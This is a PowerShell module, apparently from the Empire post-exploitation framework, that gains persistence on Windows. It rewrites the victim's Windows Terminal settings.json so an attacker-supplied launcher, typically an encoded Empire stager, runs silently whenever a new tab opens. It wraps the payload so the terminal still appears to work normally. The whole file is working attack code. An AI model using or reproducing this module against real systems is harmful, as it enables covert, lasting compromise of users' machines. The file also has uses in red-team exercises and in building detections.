function Set-WindowsTerminalProfile {
<#
.SYNOPSIS

Establishes persistence by injecting a launcher into the Windows Terminal
settings.json. The injected command runs whenever the user opens a new tab
in the targeted profile.

Author: Empire
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Command

The command to execute when Windows Terminal opens a new tab. Typically
an Empire launcher (powershell.exe -NoP -sta -W 1 -Enc <base64>).

.PARAMETER ProfileName

Optional profile name substring match. If not specified, the module will
target the profile matching defaultProfile, falling back to the first
profile in the list. Named ProfileName (not Profile) to avoid shadowing
the built-in $Profile automatic variable.

.EXAMPLE

Set-WindowsTerminalProfile -Command "powershell.exe -NoP -sta -W 1 -Enc AAA..."

#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Command,

        [string]$ProfileName = ""
    )

    $settingsPaths = @(
        "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json",
        "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminalPreview_8wekyb3d8bbwe\LocalState\settings.json",
        "$env:LOCALAPPDATA\Microsoft\Windows Terminal\settings.json"
    )

    $settingsPath = $null
    foreach ($p in $settingsPaths) {
        if (Test-Path -LiteralPath $p) {
            $settingsPath = $p
            break
        }
    }

    if (-not $settingsPath) {
        Write-Output "[-] Windows Terminal settings.json not found."
        Write-Output "[-] Checked paths:"
        $settingsPaths | ForEach-Object { Write-Output "    $_" }
        return
    }

    Write-Output "[*] Found settings.json at: $settingsPath"

    $backupPath = "$settingsPath.empire.bak"
    try {
        Copy-Item -LiteralPath $settingsPath -Destination $backupPath -Force -ErrorAction Stop
        Write-Output "[*] Backup saved to: $backupPath"
    } catch {
        Write-Output "[-] Failed to create backup; aborting: $($_.Exception.Message)"
        return
    }

    # settings.json is JSON-with-comments (JSONC). ConvertFrom-Json on
    # Windows PowerShell 5.1 silently strips comments, so the round-trip
    # can destroy user customizations. The backup above is the recovery
    # path; mention this in the user-facing output so operators know.
    try {
        $settings = Get-Content -LiteralPath $settingsPath -Raw | ConvertFrom-Json

        if (-not $settings.profiles -or -not $settings.profiles.list -or @($settings.profiles.list).Count -eq 0) {
            Write-Output "[-] No profiles found in settings.json."
            return
        }

        # Wrap the launcher in cmd.exe /c so the user still gets a shell
        # after the payload fires. Prevents the terminal from appearing
        # broken on open and preserves interactive use.
        $payloadLine = "cmd.exe /c `"$Command & powershell.exe`""

        $defaultGuid = $settings.defaultProfile
        $targetProfile = $null

        if ($ProfileName) {
            $targetProfile = $settings.profiles.list | Where-Object { $_.name -like "*$ProfileName*" } | Select-Object -First 1
            if ($targetProfile) {
                Write-Output "[*] Matched profile by name: $($targetProfile.name)"
            }
        }

        if (-not $targetProfile -and $defaultGuid) {
            $targetProfile = $settings.profiles.list | Where-Object { $_.guid -eq $defaultGuid } | Select-Object -First 1
            if ($targetProfile) {
                Write-Output "[*] Matched default profile: $($targetProfile.name)"
            }
        }

        if (-not $targetProfile) {
            $targetProfile = $settings.profiles.list[0]
            Write-Output "[!] Falling back to first profile: $($targetProfile.name)"
        }

        $targetProfile | Add-Member -NotePropertyName "commandline" -NotePropertyValue $payloadLine -Force

        $settings | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $settingsPath -Encoding UTF8
        Write-Output "[+] Windows Terminal profile modified for persistence."
        Write-Output "[+] Payload will fire when the user opens a new tab in: $($targetProfile.name)"
        Write-Output "[!] Note: any JSON comments in settings.json were stripped by the round-trip."
        Write-Output "[*] To restore: Copy-Item -LiteralPath '$backupPath' '$settingsPath' -Force"
    }
    catch {
        Write-Output "[-] Error modifying settings: $($_.Exception.Message)"
        try {
            Copy-Item -LiteralPath $backupPath -Destination $settingsPath -Force -ErrorAction Stop
            Write-Output "[*] Settings restored from backup."
        } catch {
            Write-Output "[!] Restore also failed: $($_.Exception.Message)"
            Write-Output "[!] Manual recovery required from: $backupPath"
        }
    }
}
